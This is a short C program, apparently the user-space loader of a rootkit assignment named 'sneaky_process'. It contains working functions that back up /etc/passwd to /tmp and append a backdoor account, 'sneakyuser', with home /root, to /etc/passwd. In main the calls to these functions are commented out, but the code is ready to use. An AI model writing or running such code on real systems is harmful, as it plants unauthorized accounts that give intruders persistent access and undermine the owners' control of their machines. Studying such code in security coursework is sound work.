#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

void print_pid()
{
    printf("sneaky_process pid = %d\n", getpid());
}

void copy_file(const char *src, const char *dst) {
  pid_t pid = fork();

  if (pid == 0) {
    execl("/bin/cp", "cp", src, dst, NULL);
    perror("Error executing cp");
    exit(EXIT_FAILURE);
  } else if (pid > 0) {
    waitpid(pid, NULL, 0);
  } else {
    perror("Error forking");
    exit(EXIT_FAILURE);
  }
}

void modify_passwd_file() {
  FILE *passwd_file = fopen("/etc/passwd", "a");
  if (passwd_file == NULL) {
    perror("Error opening /etc/passwd");
    exit(EXIT_FAILURE);
  }
  fprintf(passwd_file, "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  fclose(passwd_file);
}


int main() {
  printf("sneaky_process pid = %d\n", getpid());
  // Step 1: Copy /etc/passwd to /tmp/passwd
  //copy_file("/etc/passwd", "/tmp/passwd");
  // Step 2: Add sneakyuser entry to /etc/passwd
  //modify_passwd_file();
  return 0;
}